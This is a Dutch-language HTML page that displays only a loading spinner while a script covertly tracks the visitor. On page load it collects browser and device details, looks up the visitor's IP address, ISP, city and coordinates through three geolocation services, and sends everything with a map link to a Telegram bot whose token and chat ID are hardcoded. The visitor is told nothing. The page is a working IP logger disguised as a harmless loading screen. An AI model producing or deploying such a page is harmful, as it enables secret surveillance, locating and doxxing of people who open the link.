<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bezig met laden...</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: sans-serif;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #555;
      font-size: 15px;
    }
    .spinner {
      width: 32px; height: 32px;
      border: 3px solid #eee;
      border-top-color: #888;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 16px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .wrap { text-align: center; }
  </style>
</head>
<body>
<div class="wrap">
  <div class="spinner"></div>
  <p>Bezig met laden...</p>
</div>

<script>
const BOT_TOKEN = '8913098270:AAEYyuNoBoV9OlDWmkqqBZxsMOzucc1VnP4';
const CHAT_ID   = '8745877743';

async function send(msg) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: msg,
      parse_mode: 'HTML'
    })
  });
}

async function track() {
  const t = new Date().toLocaleString('nl-NL', { timeZone: 'Europe/Amsterdam' });
  const ua = navigator.userAgent;
  const taal = navigator.language || '?';
  const scherm = `${screen.width}x${screen.height}`;
  const platform = navigator.platform || '?';

  let ip = '?', isp = '?', stad = '?', regio = '?', land = '?', lat = '?', lon = '?', org = '?';

  const apis = [
    async () => {
      const d = await fetch('https://ip-api.com/json/?fields=status,query,org,city,regionName,country,lat,lon').then(r=>r.json());
      if (d.status !== 'success') throw new Error();
      return { ip: d.query, isp: d.org, stad: d.city, regio: d.regionName, land: d.country, lat: d.lat, lon: d.lon };
    },
    async () => {
      const d = await fetch('https://ipwho.is/').then(r=>r.json());
      if (!d.success) throw new Error();
      return { ip: d.ip, isp: d.connection?.org || d.connection?.isp || '?', stad: d.city, regio: d.region, land: d.country, lat: d.latitude, lon: d.longitude };
    },
    async () => {
      const d = await fetch('https://freeipapi.com/api/json').then(r=>r.json());
      return { ip: d.ipAddress, isp: d.isp || '?', stad: d.cityName, regio: d.regionName, land: d.countryName, lat: d.latitude, lon: d.longitude };
    }
  ];

  for (const api of apis) {
    try {
      const d = await api();
      ip    = d.ip    || '?';
      isp   = d.isp   || '?';
      stad  = d.stad  || '?';
      regio = d.regio || '?';
      land  = d.land  || '?';
      lat   = d.lat   || '?';
      lon   = d.lon   || '?';
      if (ip !== '?') break;
    } catch(e) {}
  }

  const maps = (lat !== '?' && lon !== '?')
    ? `https://maps.google.com/?q=${lat},${lon}`
    : null;

  const msg =
`🔔 <b>Nieuwe bezoeker</b>

🌐 <b>IP-adres:</b> <code>${ip}</code>
🏢 <b>ISP / Org:</b> ${isp}

📍 <b>Locatie</b>
   Stad: ${stad}
   Regio: ${regio}
   Land: ${land}
   Coördinaten: ${lat}, ${lon}${maps ? `\n   <a href="${maps}">Bekijk op kaart</a>` : ''}

💻 <b>Apparaat</b>
   Scherm: ${scherm}
   Platform: ${platform}
   Taal: ${taal}

🕐 <b>Tijdstip:</b> ${t}

🧭 <b>User Agent:</b>
<code>${ua}</code>`;

  await send(msg);
}

track();
</script>
</body>
</html>
